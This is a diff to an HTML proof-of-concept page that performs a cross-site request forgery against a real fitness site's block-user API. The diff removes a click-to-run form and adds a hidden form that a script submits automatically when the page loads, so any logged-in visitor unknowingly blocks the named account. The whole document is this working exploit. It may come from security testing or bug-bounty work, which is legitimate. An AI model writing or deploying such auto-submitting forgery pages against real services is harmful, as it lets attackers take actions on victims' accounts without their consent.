@@ -1,21 +1,9 @@
 <!doctype html>
-<html lang="en">
-<head>
-  <meta charset="utf-8">
-  <title>CSRF PoC — Block User (click to run)</title>
-</head>
-<body>
-  <h3>CSRF PoC — Block User</h3>
-  <p>Click the button below to send a POST to MyFitnessPal (uses form-encoded body).</p>
-
-  <form action="https://www.myfitnesspal.com/api/services/blocked_users/block" method="POST">
-    <!-- change value if needed -->
-    <input type="hidden" name="username" value="MyFitnessPal">
-    <button type="submit">Send PoC (click to run)</button>
-  </form>
-
-  <noscript>
-    <p><em>JavaScript disabled — this is still a pure-HTML form PoC.</em></p>
-  </noscript>
-</body>
+<html>
+  <body>
+    <form id="f" action="https://www.myfitnesspal.com/api/services/blocked_users/block" method="POST">
+      <input type="hidden" name="username" value="MyFitnessPal">
+    </form>
+    <script>document.getElementById('f').submit();</script>
+  </body>
 </html>
